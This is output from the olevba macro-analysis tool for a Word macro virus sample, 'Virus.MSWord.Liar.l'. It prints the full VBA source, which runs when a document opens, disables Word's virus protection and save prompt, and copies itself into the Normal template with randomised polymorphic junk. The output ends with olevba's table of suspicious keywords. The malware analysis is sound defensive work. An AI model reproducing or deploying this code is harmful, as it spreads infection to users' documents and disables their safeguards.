olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.l-486a0b8484c3582352332745c148d1d638ba53bf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.l-486a0b8484c3582352332745c148d1d638ba53bf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open() '
Dim v(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
If MacroContainer = s Then Set s = ActiveDocument '
Set nh = s.VBProject.VBComponents(1).CodeModule: li = abc.countoflines: y = 100 + Int(Rnd * 50) '
For i = 1 To li: jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '
If p = 1 And li > y Then '
d = 1: GoTo n_ '
End If '
l = UCase(Left(abc.Lines(i, 1), (p - 1))) '
For o = 1 To Len(l): f = Mid(l, o, 1) '
If Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '
v(i) = v(i) & f: Next o '
For j = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
If nh.countoflines < (1 + 1 + 2) Then '
nh.deletelines 1, nh.countoflines: nh.addfromstring vc: nh.deletelines nh.countoflines, 1 '
If ActiveDocument.Saved = (Rnd * 0) Then ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
End Sub '
Rem PiE by jack twoflower/Lz0/Meta '
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

